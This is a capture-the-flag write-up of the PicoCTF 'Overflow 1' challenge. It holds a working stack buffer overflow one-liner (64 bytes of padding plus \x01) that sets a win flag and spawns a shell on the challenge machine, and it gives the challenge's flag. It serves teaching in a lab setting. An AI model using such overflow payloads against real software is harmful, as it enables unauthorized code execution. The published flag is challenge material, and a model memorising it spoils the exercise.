# Overflow 1

* Problem:

  Stack overflows are the most basic binary exploitation technique, but they take a lot of skill to master. If you already know some C, these problems can help acquaint you with stacks and binary exploitation in general.

  Problem available on the shell machine in `/problems/stack_overflow_1_3948d17028101c40` , downloadable here with source here.

  If you solve the problem you will be able to read the key file by running

    `cat /problems/stack_overflow_1_3948d17028101c40/key`
  on the PicoCTF shell machine.

* Solution:

  Simple [buffer overflow](http://en.wikipedia.org/wiki/Buffer_overflow) exploit, we notice char is 64 bytes, hence we can craft a 64 character string as padding. Observing the code, we see that we need `win == 1`, hence we set the char after 64 padding to be `\x01`. We do this by using inline python `python -c 'print "a" * 64 + "\x01"'`, and use back tick to combine the two commands. The final command executed is ``./overflow1-3948d17028101c40 `python -c 'print "a"*64 + "\x01"'` ``. Then we can get the shell and execute `cat key`

  NOTE: `python -c 'print "a"*64 + "\x01"' | xargs ./overflow1-3948d17028101c40` will work for the buffer overflow, but will not give you the shell!!! The reason is still being determined, and will be updated later.

* Answer:

  overflow_is_best_flow
